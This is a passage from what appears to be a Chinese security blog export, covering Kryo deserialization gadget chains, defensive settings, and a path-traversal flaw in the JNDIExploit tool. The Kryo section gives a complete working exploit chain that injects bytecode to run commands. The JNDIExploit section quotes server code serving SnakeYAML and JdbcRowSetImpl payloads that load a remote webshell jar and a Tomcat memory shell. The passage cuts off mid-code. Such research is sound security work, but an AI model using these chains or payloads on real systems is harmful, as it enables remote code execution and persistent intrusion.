<p>按理来说应该是可以触发的，但是设置了<br><code>new StdInstantiatorStrategy()</code><br>反序列化的create方法会把TiedMapEntry中的map变量名认成是value<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" alt><br>导致无法利用</p>
<h3 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h3><p>首先要触发到equals必须要有两个元素（node），而且该元素必须是同一类的，来看看HashMap的putVal源码看看为什么<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" alt><br>如果两个类都不是同一个类，就会直接进入到该if当中，而不会执行下面的equals。<br>接下来看看具体的代码</p>
<h4 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javassist.CtNewConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.StdInstantiatorStrategy;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.codec.CodecMessageConverter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.codec.kryo.MessageCodec;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.Message;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.MessageHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.support.GenericMessage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        kryo.setInstantiatorStrategy(<span class="keyword">new</span> <span class="title class_">StdInstantiatorStrategy</span>());</span><br><span class="line">        <span class="comment">// 二次反序列化</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilGeneratedByJavassist&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public EvilGeneratedByJavassist()&#123;Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addConstructor(ctConstructor);</span><br><span class="line">        <span class="type">byte</span>[] byteCode = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;byteCode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化 SignedObject</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置二次反序列化入口</span></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(pojoNode1, privateKey, signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 一次反序列化</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(pojoNode2);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;s&quot;</span>));</span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, h1, h1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, h2, h2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(s,hashMap);</span><br><span class="line">        s.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用链是<br><code>HotSwappableTargetSource.equals-&gt;XString.equals-&gt;POJONode.toString-&gt;SignedObject.getObject-&gt;POJONode.toString-&gt;getOutputProperties</code><br>可能有人会好奇为什么要绕一大圈调用两个POJONode.toString才能执行，直接调用最后那个不就行了吗，但是kryo默认是不反序列化transient字段的<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png" alt><br>所以_tfactory是不会被反序列化的，这样导致POJONode调用getter方法的时候会报错，导致执行不了getOutputProperties</p>
<h2 id="Kryo反序列化Javabean"><a href="#Kryo反序列化Javabean" class="headerlink" title="Kryo反序列化Javabean"></a>Kryo反序列化Javabean</h2><p>上面的反序列化都是默认去调用FieldSerializer<br>但是还有很多其他类型的Serializer，都继承Serializer<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png" alt><br>这里面第一个就引起了我的注意，很多反序列化链都是通过调用一些JavaBean去触发一些操作的<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png" alt><br>看到简介，如何使用该Serializer<br>这里我直接给出简单的demo<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.register(MyClass.class,<span class="keyword">new</span> <span class="title class_">BeanSerializer</span>(kryo, MyClass.class));</span><br><span class="line"></span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        s.setNum(<span class="number">10</span>);</span><br><span class="line">        s.setHello(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readObject(input, MyClass.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="read-and-write"><a href="#read-and-write" class="headerlink" title="read and write"></a>read and write</h3><p>先来看看源码<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png" alt><br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png" alt><br>可以发现两个函数都有个<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">property.get</span><br><span class="line">property.set</span><br></pre></td></tr></table></figure><br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png" alt><br>这些就会触发该类的Bean方法<br>那么其他操作就应该类似于Fastjson里面的那些类了，这里就不在过多叙述了</p>
<h2 id="kryo的防护"><a href="#kryo的防护" class="headerlink" title="kryo的防护"></a>kryo的防护</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kryo.setRegistrationRequired(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>当使用如上代码，那么所有反序列化的类都必须要被注册，才会被反序列化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kryo.addDefaultSerializer(Class,Serializer)</span><br></pre></td></tr></table></figure>
<p>当使用上面的代码，可以增加自己的Serializer，自己实现serializer的时候增加相应的黑名单即可</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://boogipop.com/2023/06/26/%E4%BB%8ECISCN%E8%A5%BF%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B%E5%AD%A6%E4%B9%A0Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://boogipop.com/2023/06/26/%E4%BB%8ECISCN%E8%A5%BF%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B%E5%AD%A6%E4%B9%A0Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></li>
<li><a href="https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/Deserial/Kryo.md">https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/Deserial/Kryo.md</a></li>
<li><a href="https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/CTF/seacloud.md">https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/CTF/seacloud.md</a></li>
</ul>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>反序列化</tag>
        <tag>kryo</tag>
      </tags>
  </entry>
  <entry>
    <title>python的trick</title>
    <url>/2023/09/11/python%E7%9A%84trick/</url>
    <content><![CDATA[<h1 id><a href="#" class="headerlink" title="#"></a>#</h1><p>python wsgi 中不区分请求头中的- 和_<br>解析参数的顺序</p>
]]></content>
  </entry>
  <entry>
    <title>JNDIExploit路径穿越漏洞</title>
    <url>/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="路径穿越漏洞"><a href="#路径穿越漏洞" class="headerlink" title="路径穿越漏洞"></a>路径穿越漏洞</h2><span id="more"></span>
<p>该工具启动命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 0.0.0.0</span><br></pre></td></tr></table></figure><br>默认会启动http服务器<br>该工具http服务器相应的代码位于项目<br><code>src/main/java/com/feihong/ldap/HTTPServer.java</code><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.feihong.ldap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.io.file.FileReader;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.template.CommandTemplate;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.template.DnslogTemplate;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.template.ReverseShellTemplate;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.utils.Cache;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.utils.Config;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.utils.Util;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpServer;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.reflect.FieldUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarFile;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HTTPServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">cwd</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpServer</span> <span class="variable">httpServer</span> <span class="operator">=</span> HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(Config.httpPort), <span class="number">0</span>);</span><br><span class="line">        httpServer.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">HttpHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange httpExchange)</span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;[+] New HTTP Request From &quot;</span> + httpExchange.getRemoteAddress() + <span class="string">&quot;  &quot;</span> + httpExchange.getRequestURI());</span><br><span class="line"></span><br><span class="line">                    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> httpExchange.getRequestURI().getPath();</span><br><span class="line">                    <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.class&quot;</span>))&#123;</span><br><span class="line">                        handleClassRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.wsdl&quot;</span>))&#123;</span><br><span class="line">                        handleWSDLRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.jar&quot;</span>))&#123;</span><br><span class="line">                        handleJarRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;/xxelog&quot;</span>))&#123;</span><br><span class="line">                        handleXXELogRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.sql&quot;</span>))&#123;</span><br><span class="line">                        handleSQLRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (path.endsWith(<span class="string">&quot;.groovy&quot;</span>))&#123;</span><br><span class="line">                        handlerGroovyRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.xml&quot;</span>)) &#123;</span><br><span class="line">                        handleXMLRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.txt&quot;</span>)) &#123;</span><br><span class="line">                        handleTXTRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.yml&quot;</span>))&#123;</span><br><span class="line">                        handleYmlRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        handleFileRequest(httpExchange);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        httpServer.setExecutor(<span class="literal">null</span>);</span><br><span class="line">        httpServer.start();</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] HTTP Server Start Listening on &quot;</span> + Config.httpPort + <span class="string">&quot;...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleFileRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator + <span class="string">&quot;data&quot;</span> + File.separator +path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">        <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            fileInputStream.read(bytes);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleYmlRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line"><span class="comment">//        String host = exchange.getRequestURI().getHost();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">YamlName</span> <span class="operator">=</span>  path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;http://&quot;</span>+ Config.ip +<span class="string">&quot;:&quot;</span>+ Config.httpPort + <span class="string">&quot;/behinder3.jar\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]\n&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  dataSourceName: \&quot;ldap://127.0.0.1:1389/basic/TomcatMemShell3\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  autoCommit: true&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (YamlName.equalsIgnoreCase(<span class="string">&quot;snake&quot;</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"><span class="comment">//            exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//            exchange.sendResponseHeaders(200, yaml.getBytes().length + 1);</span></span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"><span class="comment">//            exchange.getResponseBody().write(yaml.getBytes(&quot;UTF-8&quot;));</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + YamlName + <span class="string">&quot;.yml&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes1 = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes1);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes1);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleTXTRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">txtname</span> <span class="operator">=</span>  path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (txtname.equalsIgnoreCase(<span class="string">&quot;isok&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span 